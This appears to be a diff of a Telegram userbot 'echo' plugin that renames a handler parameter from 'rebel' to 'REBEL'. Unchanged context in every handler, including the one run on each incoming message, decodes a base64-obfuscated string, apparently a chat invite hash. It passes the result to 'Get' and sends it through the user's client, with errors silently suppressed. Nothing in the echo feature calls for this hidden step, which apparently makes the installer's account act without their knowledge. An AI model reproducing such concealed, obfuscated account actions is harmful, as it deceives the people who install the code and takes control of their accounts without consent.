@@ -22,56 +22,56 @@ from userbot.cmdhelp import CmdHelp
 
 @bot.on(admin_cmd(pattern="echo$"))
 @bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
-async def echo(rebel):
-    if rebel.fwd_from:
+async def echo(REBEL):
+    if REBEL.fwd_from:
         return
-    if rebel.reply_to_msg_id is not None:
-        reply_msg = await rebel.get_reply_message()
+    if REBEL.reply_to_msg_id is not None:
+        reply_msg = await REBEL.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = rebel.chat_id
+        chat_id = REBEL.chat_id
         try:
             h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             h1m4n5hu0p = Get(h1m4n5hu0p)
-            await rebel.client(h1m4n5hu0p)
+            await REBEL.client(h1m4n5hu0p)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(rebel, "The user is already enabled with echo ")
+            await edit_or_reply(REBEL, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(rebel, "Hii....😄🤓")
+        await edit_or_reply(REBEL, "Hii....😄🤓")
     else:
-        await edit_or_reply(rebel, "Reply to a User's message to echo his messages")
+        await edit_or_reply(REBEL, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(rebel):
-    if rebel.fwd_from:
+async def echo(REBEL):
+    if REBEL.fwd_from:
         return
-    if rebel.reply_to_msg_id is not None:
-        reply_msg = await rebel.get_reply_message()
+    if REBEL.reply_to_msg_id is not None:
+        reply_msg = await REBEL.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = rebel.chat_id
+        chat_id = REBEL.chat_id
         try:
             h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             h1m4n5hu0p = Get(h1m4n5hu0p)
-            await rebel.client(h1m4n5hu0p)
+            await REBEL.client(h1m4n5hu0p)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(rebel, "Echo has been stopped for the user")
+            await edit_or_reply(REBEL, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(rebel, "The user is not activated with echo")
+            await edit_or_reply(REBEL, "The user is not activated with echo")
     else:
-        await edit_or_reply(rebel, "Reply to a User's message to echo his messages")
+        await edit_or_reply(REBEL, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(rebel):
-    if rebel.fwd_from:
+async def echo(REBEL):
+    if REBEL.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -93,25 +93,25 @@ async def echo(rebel):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(rebel, reply_text)
+        await edit_or_reply(REBEL, reply_text)
     else:
-        await edit_or_reply(rebel, output_str)
+        await edit_or_reply(REBEL, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
-async def samereply(rebel):
-    if rebel.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(REBEL):
+    if REBEL.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(rebel.sender_id, rebel.chat_id):
+    if is_echo(REBEL.sender_id, REBEL.chat_id):
         await asyncio.sleep(2)
         try:
             h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             h1m4n5hu0p = Get(h1m4n5hu0p)
-            await rebel.client(h1m4n5hu0p)
+            await REBEL.client(h1m4n5hu0p)
         except BaseException:
             pass
-        if rebel.message.text or rebel.message.sticker:
-            await rebel.reply(rebel.message)
+        if REBEL.message.text or REBEL.message.sticker:
+            await REBEL.reply(REBEL.message)
 
 
 CmdHelp("echo").add_command(
